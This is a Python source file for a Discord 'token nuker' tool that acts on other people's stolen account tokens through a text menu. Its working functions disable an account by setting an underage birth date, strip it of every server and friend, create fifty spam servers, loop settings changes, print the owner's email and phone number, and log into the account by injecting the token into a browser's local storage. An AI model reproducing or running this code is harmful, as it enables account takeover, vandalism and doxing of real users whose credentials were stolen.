import threading, requests, discord, random, time, os
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
init(convert=True)
guildsIds = []
friendsIds = []
clear = lambda : os.system('cls')
clear()

class Login(discord.Client):

    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
        else:
            for f in self.user.friends:
                friendsIds.append(f.id)
            else:
                await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            try:
                print(f"[{Fore.MAGENTA}-{Fore.RESET}] Invalid token", e)
                input('Press any key to exit...')
                exit(0)
            finally:
                e = None
                del e


def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }\n            '
    driver.get('https://discord.com/login')
    driver.execute_script(script + f'\nlogin("{token}")')


def tokenInfo(token):
    headers = {'Authorization':token, 
     'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n            [{Fore.MAGENTA}User ID{Fore.RESET}]            {Fore.MAGENTA}>{Fore.RESET}       {userID}\n            [{Fore.MAGENTA}User Name{Fore.RESET}]          {Fore.MAGENTA}>{Fore.RESET}       {userName}\n            [{Fore.MAGENTA}2 Factor{Fore.RESET}]           {Fore.MAGENTA}>{Fore.RESET}       {mfa}\n            [{Fore.MAGENTA}Email{Fore.RESET}]              {Fore.MAGENTA}>{Fore.RESET}       {email}\n            [{Fore.MAGENTA}Phone number{Fore.RESET}]       {Fore.MAGENTA}>{Fore.RESET}       {phone if phone else ''}\n            [{Fore.MAGENTA}Token{Fore.RESET}]              {Fore.MAGENTA}>{Fore.RESET}       {token}\n            ")
        input()


def tokenFuck(token):
    headers = {'Authorization': token}
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking the account right now ...")
    for guild in guildsIds:
        requests.delete(f"https://discord.com/api/v6/users/@me/guilds/{guild}", headers=headers)
    else:
        for friend in friendsIds:
            requests.delete(f"https://discord.com/api/v6/users/@me/relationships/{friend}", headers=headers)
        else:
            for i in range(50):
                payload = {'name':f"Icy On Top {i}", 
                 'region':'europe',  'icon':None,  'channels':None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
            else:
                modes = cycle(['light', 'dark'])
                while True:
                    setting = {'theme':next(modes), 
                     'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                    requests.patch('https://discord.com/api/v6/users/@me/settings', headers=headers, json=setting)


def tokenDisable(token):
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
    if r.status_code == 400:
        print(f"> {Fore.MAGENTA}[{Fore.RESET}Account disabled{Fore.MAGENTA}]{Fore.RESET}")
        input('Press any key to exit...')
    else:
        print(f"> {Fore.MAGENTA}[{Fore.RESET}Invalid token{Fore.MAGENTA}]{Fore.RESET}")
        input('Press any key to exit...')


def getBanner():
    banner = f"\n                                           {Fore.MAGENTA}▌ ▐{Fore.RESET}·      ▪  ·{Fore.MAGENTA}▄▄▄▄  ▄▄▄{Fore.RESET} .·{Fore.MAGENTA}▄▄▄▄  \n                                          {Fore.RESET}▪{Fore.MAGENTA}█{Fore.RESET}·{Fore.MAGENTA}█▌{Fore.RESET}▪     {Fore.MAGENTA}██ ██{Fore.RESET}▪ {Fore.MAGENTA}██ ▀▄{Fore.RESET}.{Fore.MAGENTA}▀{Fore.RESET}·{Fore.MAGENTA}██{Fore.RESET}▪ {Fore.MAGENTA}██ \n                                          ▐█▐█{Fore.RESET}•{Fore.MAGENTA} ▄█▀▄ ▐█{Fore.RESET}·{Fore.MAGENTA}▐█{Fore.RESET}· {Fore.MAGENTA}▐█▌▐▀▀{Fore.RESET}▪{Fore.MAGENTA}▄▐█{Fore.RESET}·{Fore.MAGENTA} ▐█▌\n                                           ███ ▐█▌{Fore.RESET}.{Fore.MAGENTA}▐▌▐█▌██{Fore.RESET}.{Fore.MAGENTA} ██ ▐█▄▄▌██{Fore.RESET}.{Fore.MAGENTA} ██ \n                                          {Fore.RESET}.{Fore.MAGENTA} ▀   ▀█▄▀{Fore.RESET}▪{Fore.MAGENTA}▀▀▀▀▀▀▀▀{Fore.RESET}• {Fore.MAGENTA} ▀▀▀ ▀▀▀▀▀{Fore.RESET}•{Fore.MAGENTA}\n                                                     Icy#{Fore.RESET}1400\n\n                                  {Fore.MAGENTA}[{Fore.RESET}Type{Fore.MAGENTA}]              {Fore.MAGENTA}[{Fore.RESET}Info{Fore.MAGENTA}]{Fore.RESET}\n                                  1 {Fore.MAGENTA}-{Fore.RESET} Disables the account.\n                                  2 {Fore.MAGENTA}-{Fore.RESET} Fuck up that token.\n                                  3 {Fore.MAGENTA}-{Fore.RESET} Gets account info.\n                                  4 {Fore.MAGENTA}-{Fore.RESET} Login someones account via token.\n    ".replace('░', f"{Fore.RED}░{Fore.RESET}")
    return banner


def startMenu():
    print(getBanner())
    print(f"{Fore.MAGENTA}~${Fore.RESET}", end='')
    choice = str(input(':'))
    if choice == '1':
        print(f"{Fore.MAGENTA}~${Fore.RESET}disable {Fore.MAGENTA}>{Fore.RESET} Account token", end='')
        token = input(': ')
        tokenDisable(token)
    else:
        if choice == '2':
            print(f"{Fore.MAGENTA}~${Fore.RESET}fuck {Fore.MAGENTA}>{Fore.RESET} Account token", end='')
            token = input(': ')
            print(f"{Fore.MAGENTA}~${Fore.RESET}fuck/threads {Fore.MAGENTA}>{Fore.RESET} Thread amount", end='')
            threads = input(': ')
            Login().run(token)
            if threading.active_count() < int(threads):
                t = threading.Thread(target=tokenFuck, args=(token,))
                t.start()
        elif choice == '3':
            print(f"{Fore.MAGENTA}~${Fore.RESET}dox {Fore.MAGENTA}>{Fore.RESET} Account token", end='')
            token = input(': ')
            tokenInfo(token)
        else:
            if choice == '4':
                print(f"{Fore.MAGENTA}~${Fore.RESET}login {Fore.MAGENTA}>{Fore.RESET} Account token", end='')
                token = input(': ')
                tokenLogin(token)
            else:
                if choice.isdigit() == False:
                    clear()
                    startMenu()
                else:
                    clear()
                    startMenu()


if __name__ == '__main__':
    startMenu()